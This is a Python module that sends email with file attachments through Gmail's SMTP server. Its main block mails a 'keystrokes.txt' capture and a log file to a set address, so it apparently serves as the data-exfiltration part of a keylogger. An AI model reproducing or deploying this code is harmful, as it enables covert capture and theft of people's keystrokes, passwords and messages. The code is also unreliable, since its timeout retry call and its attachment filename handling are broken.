import smtplib,ssl
import psw
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from config import DEBUG

class Email:
    def __init__(self) -> None:
        self.SMTP_SERVER= "smtp.gmail.com"  # Replace with your SMTP server
        self.SMTP_PORT = 587  # Use 465 for SSL or 587 for TLS
        self.USERNAME = psw.email  # Your email login
        self.PASSWORD = psw.psw  # Your email password
        
    def send_email(self,*args:str,sender_email:str,receiver_email:str,subject:str,body:str) -> None:
        self.sender_email = sender_email
        self.receiver_email = receiver_email
        self.subject = subject
        self.body = body
        self.args = args
        
        message = MIMEMultipart()
        message["From"] = sender_email
        message["To"] = receiver_email
        message["Subject"] = subject
        
        # Attach email body
        message.attach(MIMEText(body, "plain"))
        
        # Attach file
        if args:
            for file in args:
                with open(file, "rb") as file:
                    part = MIMEBase("application", "octet-stream")
                    part.set_payload(file.read())

                encoders.encode_base64(part)  # Encode to base64
                part.add_header("Content-Disposition", f"attachment; filename={file}")  # Manually set file name
                message.attach(part)  # Attach the file to the email

        context = ssl.create_default_context()
        # Send email
        try:
            with smtplib.SMTP(self.SMTP_SERVER, self.SMTP_PORT) as server:
                server.ehlo()  # Can be omitted
                server.starttls(context=context)
                server.ehlo()  # Can be omitted
                server.login(self.USERNAME, self.PASSWORD)
                server.sendmail(sender_email, receiver_email, message.as_string())
        except TimeoutError:
            if DEBUG:
                print("Timeout Error raised")
            self.send_email(self.args,self.sender_email,self.receiver_email,self.subject,self.body) #! Must be looked





if __name__ == "__main__":
    app = Email()
    app.send_email(
        "./LOGS/logs.log",
        "./LOGS/keystrokes.txt",
        receiver_email=psw.email,
        sender_email=psw.email,
        subject="Email with Attachment",
        body="Hello, please find the attached file."
    )